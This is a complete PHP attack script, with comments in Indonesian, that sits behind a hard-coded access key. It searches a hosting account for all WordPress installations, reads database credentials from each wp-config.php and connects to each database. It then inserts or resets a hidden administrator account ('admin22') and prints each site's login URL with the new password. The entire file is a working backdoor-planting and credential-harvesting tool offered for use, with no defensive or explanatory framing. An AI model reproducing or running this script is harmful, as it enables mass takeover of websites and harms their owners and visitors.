<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
set_time_limit(0);

/* ================= CONFIG ================= */
$ACCESS_KEY = 'tdn22';
$ADMIN_USER = 'admin22';
$PASS_LEN   = 14;
/* ========================================== */

if (!isset($_GET['key']) || $_GET['key'] !== $ACCESS_KEY) {
    http_response_code(403);
    exit('403 Forbidden');
}

/* auto detect /home/username */
$home = dirname(dirname(__DIR__));

echo "<pre>";
echo "[+] HOME  : $home\n";

/* random password */
function rand_pass($len) {
    return substr(str_shuffle(
        'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%&_'
    ), 0, $len);
}

/* scan WordPress */
$wps = [];

function scan_wp($dir, &$wps) {
    if (!is_dir($dir) || is_link($dir)) return;

    $list = @scandir($dir);
    if (!$list) return;

    if (in_array('wp-config.php', $list)) {
        $wps[] = realpath($dir);
        return;
    }

    foreach ($list as $i) {
        if ($i === '.' || $i === '..') continue;
        if (preg_match('/^(cache|logs|tmp|ssl|\.cpanel)$/i', $i)) continue;
        scan_wp($dir . '/' . $i, $wps);
    }
}

scan_wp($home, $wps);

echo "[+] FOUND : " . count($wps) . " WordPress\n\n";

foreach ($wps as $wp) {

    $cfg = @file_get_contents($wp . '/wp-config.php');
    if (!$cfg) {
        echo "SKIP   : wp-config not readable\n";
        continue;
    }

    // Pattern yang lebih fleksibel untuk menangkap konfigurasi
    $patterns = [
        'db_name' => "/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i",
        'db_user' => "/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i",
        'db_pass' => "/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i",
        'db_host' => "/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i",
        'table_prefix' => "/\\\$table_prefix\s*=\s*['\"]([^'\"]+)['\"]\s*;/i"
    ];

    $config = [];
    foreach ($patterns as $key => $pattern) {
        if (preg_match($pattern, $cfg, $matches)) {
            $config[$key] = trim($matches[1]);
        } else {
            $config[$key] = null;
        }
    }

    // Coba alternatif pattern untuk table_prefix jika tidak ditemukan
    if (!$config['table_prefix']) {
        // Pattern alternatif untuk $table_prefix
        $alt_patterns = [
            "/table_prefix\s*=\s*['\"]([^'\"]+)['\"]/i",
            "/\\\$table_prefix\s*=\s*['\"]([^'\"]+)['\"]/",
            "/table_prefix\s*=\s*'([^']+)'/",
            "/table_prefix\s*=\s*\"([^\"]+)\"/",
            "/\\\$table_prefix\s*=\s*'([^']+)'/",
            "/\\\$table_prefix\s*=\s*\"([^\"]+)\"/"
        ];
        
        foreach ($alt_patterns as $alt_pattern) {
            if (preg_match($alt_pattern, $cfg, $matches)) {
                $config['table_prefix'] = trim($matches[1]);
                break;
            }
        }
    }

    // Periksa apakah semua variabel penting ditemukan
    if (!$config['db_name'] || !$config['db_user'] || !$config['db_pass'] || !$config['table_prefix']) {
        echo "SKIP   : invalid wp-config (missing required variables)\n";
        continue;
    }

    // Gunakan localhost jika host tidak ditemukan
    $db_host = $config['db_host'] ?: 'localhost';
    
    $mysqli = @new mysqli(
        $db_host,
        $config['db_user'],
        $config['db_pass'],
        $config['db_name']
    );

    if ($mysqli->connect_error) {
        echo "SKIP   : DB connect failed: " . $mysqli->connect_error . "\n";
        continue;
    }

    $table_prefix = $config['table_prefix'];

    /* get siteurl */
    $res = $mysqli->query(
        "SELECT option_value FROM `{$table_prefix}options` 
         WHERE option_name='siteurl' LIMIT 1"
    );
    $siteurl = ($res && $res->num_rows)
        ? $res->fetch_row()[0]
        : '-';


    // Generate password
    $password = rand_pass($PASS_LEN);
    
    // Method 1: Coba gunakan WordPress hash jika bisa di-load
    $hash = null;
    
    // Coba load WordPress environment
    $wp_load_path = $wp . '/wp-load.php';
    if (file_exists($wp_load_path)) {
        // Backup current directory
        $old_cwd = getcwd();
        chdir($wp);
        
        // Define constants untuk mencegah WordPress mengirim output
        if (!defined('WP_USE_THEMES')) define('WP_USE_THEMES', false);
        if (!defined('SHORTINIT')) define('SHORTINIT', true);
        
        try {
            require_once $wp . '/wp-load.php';
            
            if (function_exists('wp_hash_password')) {
                $hash = wp_hash_password($password);
            }
        } catch (Exception $e) {
            // Fallback ke method 2
        }
        
        // Restore directory
        chdir($old_cwd);
    }
    
    // Method 2: Jika WordPress tidak bisa di-load, gunakan MD5 (untuk WordPress lama)
    // atau gunakan metode hash langsung
    if (!$hash) {
        // Untuk WordPress versi baru (menggunakan phpass)
        // Kita akan gunakan PASSWORD_BCRYPT sebagai fallback
        $hash = password_hash($password, PASSWORD_BCRYPT);
        
        // Atau gunakan MD5 untuk WordPress lama
        // $hash = md5($password);
        
    }

    // Escape input untuk keamanan
    $admin_user_escaped = $mysqli->real_escape_string($ADMIN_USER);
    $hash_escaped = $mysqli->real_escape_string($hash);

    // Periksa apakah user sudah ada
    $check = $mysqli->query(
        "SELECT ID FROM `{$table_prefix}users` 
         WHERE user_login='{$admin_user_escaped}' LIMIT 1"
    );

    if ($check && $check->num_rows) {
        $uid = $check->fetch_row()[0];
        $mysqli->query(
            "UPDATE `{$table_prefix}users` 
             SET user_pass='{$hash_escaped}' WHERE ID={$uid}"
        );
        $mysqli->query(
            "UPDATE `{$table_prefix}usermeta` 
             SET meta_value='a:1:{s:13:\"administrator\";b:1;}' 
             WHERE user_id={$uid} 
             AND meta_key='{$table_prefix}capabilities'"
        );
        $status = 'RESET';
    } else {
        $email = $ADMIN_USER . '@example.com';
        $email_escaped = $mysqli->real_escape_string($email);
        
        $mysqli->query(
            "INSERT INTO `{$table_prefix}users` 
            (user_login,user_pass,user_email,user_registered,display_name)
            VALUES 
            ('{$admin_user_escaped}','{$hash_escaped}','{$email_escaped}',NOW(),'{$admin_user_escaped}')"
        );
        $uid = $mysqli->insert_id;
        $mysqli->query(
            "INSERT INTO `{$table_prefix}usermeta` 
            (user_id,meta_key,meta_value) VALUES
            ({$uid},'{$table_prefix}capabilities','a:1:{s:13:\"administrator\";b:1;}'),
            ({$uid},'{$table_prefix}user_level','10')"
        );
        $status = 'CREATED';
    }

    echo "$siteurl/wp-login.php#{$ADMIN_USER}#{$password}\n";
}

echo "\n[✓] DONE\n</pre>";
